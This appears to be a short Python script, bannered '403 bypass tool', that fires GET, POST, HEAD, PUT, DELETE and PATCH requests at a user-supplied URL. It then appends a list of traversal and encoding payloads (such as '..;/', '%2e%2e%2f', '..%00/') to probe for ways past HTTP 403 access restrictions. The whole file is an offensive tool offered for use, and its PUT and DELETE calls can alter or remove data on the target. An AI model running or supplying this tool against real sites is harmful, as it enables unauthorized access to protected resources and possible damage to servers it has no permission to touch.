import pyfiglet
import requests

banner = pyfiglet.figlet_format("403 bypass tool")
print(banner)

url = input("Enter the URL: ")

# different methods code

req1 = requests.get(url, allow_redirects=False)
print("using GET     method : " + str(req1.status_code))

req2 = requests.post(url, allow_redirects=False)
print("using POST    method : " + str(req2.status_code))

req3 = requests.head(url, allow_redirects=False)
print("using HEAD    method : " + str(req3.status_code))

req4 = requests.put(url, allow_redirects=False)
print("using PUT     method : " + str(req4.status_code))

req5 = requests.delete(url, allow_redirects=False)
print("using DELETE  method : " + str(req5.status_code))

req6 = requests.patch(url, allow_redirects=False)
print("using PATCH   method : " + str(req6.status_code))

print("--------------------   Methods completed     ---------------------\n")

#using payloads
print("---------------- Using payload of URL started ----------------------")

pays = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23"]

for payloads in pays:
     url2 = url + payloads
     req7 = requests.get(url2, allow_redirects=False)
     print(url2 + " : " + str(req7.status_code))
